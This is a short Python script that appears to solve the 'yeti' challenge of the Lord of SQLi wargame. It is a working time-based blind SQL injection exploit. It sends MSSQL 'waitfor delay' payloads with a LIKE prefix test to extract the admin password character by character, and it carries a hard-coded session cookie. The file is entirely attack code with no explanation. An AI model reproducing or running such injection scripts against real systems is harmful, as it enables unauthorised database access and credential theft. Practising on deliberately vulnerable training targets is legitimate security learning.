# lordofsqli: yeti
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php'
cookies = {'PHPSESSID': 'tn610bhfuga5petuu89p999kpl'}

charset = digits + ascii_lowercase
passwd = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        payload = {'id': f"' if ((select pw from prob_yeti where id='admin') like '{passwd + c}%') waitfor delay '00:00:02'--"}
        r = requests.get(url, payload, cookies=cookies)
    
        print(f'{c}: {r.elapsed.seconds}s')
        if r.elapsed.seconds >= 2:
            passwd += c
            finish = False
            print('->' + passwd)
            break

print('->' + passwd)
